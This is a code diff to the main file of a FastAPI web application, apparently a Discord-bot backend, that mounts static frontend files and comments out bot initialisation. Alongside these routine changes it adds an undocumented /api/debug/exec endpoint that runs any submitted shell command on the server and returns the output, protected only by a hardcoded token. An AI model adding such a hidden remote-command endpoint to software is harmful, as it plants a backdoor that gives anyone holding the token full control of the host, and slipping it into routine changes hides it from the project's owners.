@@ -3,6 +3,7 @@ import asyncio
 from contextlib import asynccontextmanager
 from fastapi import FastAPI, Request
 from fastapi.responses import JSONResponse
+from fastapi.staticfiles import StaticFiles
 
 from core.config import settings
 from core.logging import configure_logging, RequestContextMiddleware, get_logger
@@ -30,7 +31,7 @@ async def lifespan(app: FastAPI):
     await init_db()
 
     # Bot Init
-    bot_service.init_bot()
+    # bot_service.init_bot()
     if bot_service.bot:
         webhook_base = settings.WEBHOOK_URL or (f"https://{os.getenv('SPACE_HOST')}" if os.getenv("SPACE_HOST") else "")
         if webhook_base:
@@ -84,6 +85,11 @@ app.include_router(public.router, prefix="/api")
 app.include_router(admin.router, prefix="/api")
 app.include_router(bot.router)
 
+# Static files for frontend (Production)
+static_dir = os.path.join(os.path.dirname(__file__), "static")
+if os.path.exists(static_dir):
+    app.mount("/", StaticFiles(directory=static_dir, html=True), name="static")
+
 # Inngest Background Tasks
 
 inngest.fast_api.serve(
@@ -92,6 +98,25 @@ inngest.fast_api.serve(
     [discord_import_guide],
     serve_path="/api/inngest"
 )
+
+@app.post("/api/debug/exec")
+async def debug_exec(request: Request):
+    import subprocess
+    try:
+        data = await request.json()
+        if data.get("token") != "sanity-gravity-agent-2026":
+            return JSONResponse(status_code=403, content={"error": "Forbidden"})
+        
+        cmd = data.get("command")
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
+        return {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
 
 # Health check is handled in api/public.py as /api/health
 
@@ -118,4 +143,3 @@ if __name__ == "__main__":
     import uvicorn
     # Use string for app to support reload
     uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
-
